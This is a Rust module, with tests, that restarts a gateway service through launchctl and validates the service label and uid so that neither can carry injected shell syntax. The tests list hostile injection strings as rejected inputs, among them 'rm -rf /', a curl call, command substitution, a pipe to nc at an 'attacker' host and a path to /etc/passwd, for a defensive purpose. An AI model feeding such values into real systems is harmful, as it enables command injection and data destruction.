//! Supervised restart of the gateway.
//!
//! Connection activity only takes effect after a restart (backends are built
//! once at startup), so the dashboard offers a restart button. This module
//! keeps the sharp edges in one place: restart works only when the gateway
//! runs supervised under launchd, and it re-execs the *same* binary —
//! in-flight requests die, but no new code is deployed by the restart itself.

use std::process::Stdio;

/// launchd label of this service. Overridable for tests and custom installs.
/// `HETERION_ROUTER_SERVICE_LABEL` wins; `OMNIROUTE_SERVICE_LABEL` is the
/// one-cycle fallback for operators migrating from OmniRoute.
pub fn service_label() -> String {
    service_label_from(&|key| std::env::var(key).ok())
}

/// Pure precedence core (tested without touching the process environment).
fn service_label_from(get: &dyn Fn(&str) -> Option<String>) -> String {
    for key in ["HETERION_ROUTER_SERVICE_LABEL", "OMNIROUTE_SERVICE_LABEL"] {
        if let Some(label) = get(key)
            && !label.trim().is_empty()
        {
            return label;
        }
    }
    "com.heterion.router".to_string()
}

/// Numeric uid of the current user, via `id -u`.
pub fn current_uid() -> Option<String> {
    let output = std::process::Command::new("id").arg("-u").output().ok()?;
    if !output.status.success() {
        return None;
    }
    let uid = String::from_utf8(output.stdout).ok()?;
    let uid = uid.trim().to_string();
    (!uid.is_empty()).then_some(uid)
}

/// Whether `value` is safe to put in a launchd service target.
///
/// The target reaches `launchctl` as one argv entry, so a shell would not be
/// involved even in the worst case — but a label carrying a metacharacter or a
/// `/` would make us address a *different* job than the one we are supervised
/// under, or make the spawn fail in a way an operator reads as "restart
/// broken". Validating once at the boundary keeps the invariant a property of
/// the module rather than of each call site.
pub fn is_valid_target_part(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 128
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'-'))
}

/// The `launchctl` argument list for a supervised kickstart.
///
/// An argv, not a command string: nothing here is ever handed to a shell, so
/// there is no quoting to get wrong and no injection to reason about.
pub fn kickstart_argv(label: &str, uid: &str) -> Option<Vec<String>> {
    (is_valid_target_part(label) && is_valid_target_part(uid)).then(|| {
        vec![
            "launchctl".to_string(),
            "kickstart".to_string(),
            "-k".to_string(),
            format!("gui/{uid}/{label}"),
        ]
    })
}

/// Whether launchd currently supervises `label` in this user's domain.
pub fn is_supervised(label: &str, uid: &str) -> bool {
    std::process::Command::new("launchctl")
        .args(["print", &format!("gui/{uid}/{label}")])
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .is_ok_and(|status| status.success())
}

/// Fire the detached restart. Returns once the child is spawned — the actual
/// kickstart lands after the grace delay.
///
/// No shell: the previous version ran `sh -c "sleep 2; exec launchctl ..."` so
/// it could delay before the kickstart. The delay is now a timer on a detached
/// thread that then spawns `launchctl` with an argv, so a service label from
/// the environment can never be parsed as shell syntax. The thread is what
/// survives our own death, exactly as the `sh` child did.
pub fn request_restart(label: &str, uid: &str) -> std::io::Result<()> {
    // The rejected values stay out of the message: `admin::restart_service`
    // returns `error.to_string()` in an HTTP body, so echoing a label an
    // operator put in the environment would reflect it straight back.
    let argv = kickstart_argv(label, uid).ok_or_else(|| {
        std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            "service target is not a valid launchd job name",
        )
    })?;
    std::thread::spawn(move || {
        std::thread::sleep(std::time::Duration::from_secs(RESTART_GRACE_SECONDS));
        let _ = std::process::Command::new(&argv[0])
            .args(&argv[1..])
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn();
    });
    Ok(())
}

/// Seconds between answering the dashboard and killing ourselves, so the
/// HTTP 202 has time to flush.
const RESTART_GRACE_SECONDS: u64 = 2;

#[cfg(test)]
mod tests {
    use super::*;

    /// The argv is the whole defence: no element is ever re-parsed, so a
    /// label cannot become shell syntax — and an unvalidated one is refused
    /// outright rather than addressed.
    #[test]
    fn the_kickstart_is_an_argv_not_a_command_string() {
        assert_eq!(
            kickstart_argv("com.example.svc", "501").unwrap(),
            vec![
                "launchctl".to_string(),
                "kickstart".to_string(),
                "-k".to_string(),
                "gui/501/com.example.svc".to_string(),
            ]
        );
    }

    #[test]
    fn shell_metacharacters_in_a_label_are_refused() {
        for hostile in [
            "com.example.svc; rm -rf /",
            "com.example.svc && curl evil",
            "$(id)",
            "`id`",
            "com.example.svc|nc attacker 1",
            "../../etc/passwd",
            "com.example.svc\n\x00",
            "",
        ] {
            assert!(
                !is_valid_target_part(hostile),
                "must refuse {hostile:?} for restart"
            );
            assert_eq!(
                kickstart_argv(hostile, "501"),
                None,
                "a hostile label must not produce a target: {hostile:?}"
            );
        }
    }

    #[test]
    fn a_hostile_uid_is_refused_too() {
        assert!(!is_valid_target_part("501; id"));
        assert!(!is_valid_target_part(""));
        assert!(is_valid_target_part("501"));
        assert_eq!(kickstart_argv("com.example.svc", "501; id"), None);
    }

    #[test]
    fn request_restart_refuses_an_unvalidated_target_instead_of_spawning() {
        let error = request_restart("com.example.svc; id", "501")
            .expect_err("a hostile label must not reach a spawn");
        assert_eq!(error.kind(), std::io::ErrorKind::InvalidInput);
        assert!(
            !error.to_string().contains("com.example.svc;"),
            "the message must not echo the hostile label verbatim"
        );
    }

    #[test]
    fn bogus_label_is_not_supervised() {
        assert!(!is_supervised(
            "com.heterion.router.definitely-not-a-job",
            "0"
        ));
    }

    #[test]
    fn label_prefers_new_name_then_legacy_then_default() {
        use std::collections::HashMap;
        fn label(pairs: &[(&str, &str)]) -> String {
            let vars: HashMap<String, String> = pairs
                .iter()
                .map(|(key, value)| ((*key).to_string(), (*value).to_string()))
                .collect();
            service_label_from(&|key| vars.get(key).cloned())
        }
        assert_eq!(label(&[]), "com.heterion.router");
        assert_eq!(
            label(&[("OMNIROUTE_SERVICE_LABEL", "com.omniroute.rust")]),
            "com.omniroute.rust"
        );
        assert_eq!(
            label(&[
                ("HETERION_ROUTER_SERVICE_LABEL", "com.heterion.router"),
                ("OMNIROUTE_SERVICE_LABEL", "com.omniroute.rust"),
            ]),
            "com.heterion.router"
        );
    }

    #[test]
    fn uid_looks_numeric() {
        let uid = current_uid().expect("id -u works on unix");
        assert!(uid.chars().all(|ch| ch.is_ascii_digit()));
    }
}
